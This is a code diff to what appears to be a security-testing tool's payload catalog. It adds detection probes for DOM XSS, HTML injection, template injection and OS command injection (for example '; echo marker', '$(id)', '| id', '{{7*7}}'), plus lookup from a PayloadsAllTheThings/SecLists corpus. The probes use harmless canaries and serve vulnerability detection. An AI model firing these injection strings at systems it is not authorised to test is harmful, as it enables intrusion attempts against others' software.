@@ -135,6 +135,37 @@ BUILTINS: Dict[str, List[Dict[str, str]]] = {
     "deserialization_rce": [
         p("<serialized-gadget>", "craft the language's serialized object with a benign filesystem side effect, then read the marker back (file_created_then_deleted)", "gadget"),
     ],
+    # --- expanded categories (deep-mode systematic sweep) --------------------------
+    # These four have no benchmark vuln_class of their own; the sweep addresses them by
+    # KEY and reports a confirmed hit under the nearest scored class (dom/html -> an xss
+    # class; ssti/command injection -> the injection/rce impact they culminate in). Each
+    # payload embeds a UNIQUE canary so the fuzz oracle can prove reflection/evaluation.
+    "dom_xss": [
+        p("#<img src=x onerror=alert(1)>", "hash-fragment sink: rendered into the DOM client-side (prove with a browser/xss-dom-sinks, not HTTP body)", "sink"),
+        p("javascript:alert(1)", "location/href sink that executes a javascript: URI", "sink"),
+        p("\";alert(1)//", "string-break into an eval/innerHTML/document.write sink", "sink"),
+        p("<svg onload=alert(1)>", "reflected-into-DOM markup that a client sink executes", "sink"),
+    ],
+    "html_injection": [
+        p("<u>sahwHTML1</u>", "unescaped tag reflected verbatim (body_contains the tag, absent in a benign-text control)", "reflection"),
+        p("<a href=//sahw.example>x</a>", "injected anchor/markup rendered unescaped", "reflection"),
+        p("<img src=x>", "bare tag reflected unescaped", "reflection"),
+    ],
+    "ssti": [
+        p("${{7*7}}", "if the response contains the COMPUTED 49 (not the literal payload), the template engine evaluated it; control sends {{6*6}}->36", "eval"),
+        p("{{7*7}}", "Jinja2/Twig/Nunjucks arithmetic evaluation probe -> computed 49", "eval"),
+        p("<%= 7*7 %>", "ERB/EJS evaluation probe -> computed 49", "eval"),
+        p("#{7*7}", "Ruby/Thymeleaf-style evaluation probe -> computed 49", "eval"),
+        p("*{7*7}", "Spring EL evaluation probe -> computed 49", "eval"),
+    ],
+    "command_injection": [
+        p("; echo sahwCMD42", "the COMPUTED marker sahwCMD42 in the response (not the literal payload) = OS command executed", "exec"),
+        p("| id", "output containing uid=/gid= = command executed", "exec"),
+        p("$(id)", "command substitution -> uid= in the response", "exec"),
+        p("`id`", "backtick substitution variant", "exec"),
+        p("& whoami", "windows/chained command variant", "exec"),
+        p("\n id \n", "newline-injected command when the value lands in a shell context", "exec"),
+    ],
 }
 
 # vuln_class -> sibling asset files to augment the built-ins.
@@ -145,6 +176,7 @@ ASSET_MAP: Dict[str, List[str]] = {
     "business_logic": ["api-graphql-specifics/assets/mass-assignment-fields.txt"],
     "sqli": ["injection-battery-xxe-ssti-nosql/assets/injection-payloads.json"],
     "xxe": ["injection-battery-xxe-ssti-nosql/assets/injection-payloads.json"],
+    "ssti": ["injection-battery-xxe-ssti-nosql/assets/injection-payloads.json"],
 }
 
 
@@ -205,7 +237,21 @@ def main() -> int:
 
     asset_payloads, sources = _augment_from_assets(vuln_class, technique, limit)
 
-    combined = built + asset_payloads
+    # Corpus KB (PayloadsAllTheThings + SecLists), when the SQLite index has been built.
+    # Curated BUILTINS stay FIRST (cheapest, highest-signal triage probes); the broad
+    # corpus augments for depth/escalation. Absent DB -> empty, graceful fallback.
+    corpus_payloads: List[Dict[str, str]] = []
+    corpus_db = os.environ.get("SAHW_PAYLOAD_DB", "").strip()
+    if corpus_db and os.path.exists(corpus_db):
+        try:
+            from corpus import search as _corpus_search  # sibling module
+            corpus_payloads = _corpus_search(corpus_db, vuln_class, limit, technique)
+            if corpus_payloads:
+                sources.append("corpus")
+        except Exception:
+            corpus_payloads = []
+
+    combined = built + asset_payloads + corpus_payloads
     # de-dup by value, preserve order (built-ins first = cheapest probes first)
     seen = set()
     deduped: List[Dict[str, str]] = []
